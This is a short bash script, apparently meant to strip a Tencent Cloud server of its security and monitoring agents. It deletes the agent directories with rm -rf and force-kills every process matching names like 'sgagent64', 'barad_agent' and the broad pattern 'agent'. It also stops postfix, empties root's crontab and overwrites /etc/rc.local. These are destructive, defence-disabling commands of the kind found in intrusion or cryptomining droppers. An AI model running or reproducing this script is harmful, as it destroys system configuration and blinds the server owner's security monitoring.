#!/bin/bash 
rm -rf /usr/local/sa 
rm -rf /usr/local/agenttools 
rm -rf /usr/local/qcloud 
process=(sap100 secu-tcs-agent sgagent64 barad_agent agent agentPlugInD pvdriver ) 
for i in ${process[@]} 
do
for A in $(ps aux |grep $i |grep -v grep |awk '{print $2}') 
do
kill -9 $A 
done 
done 
chkconfig --level 35 postfix off 
service postfix stop 
echo ''>/var/spool/cron/root 
echo '#!/bin/bash' >/etc/rc.local
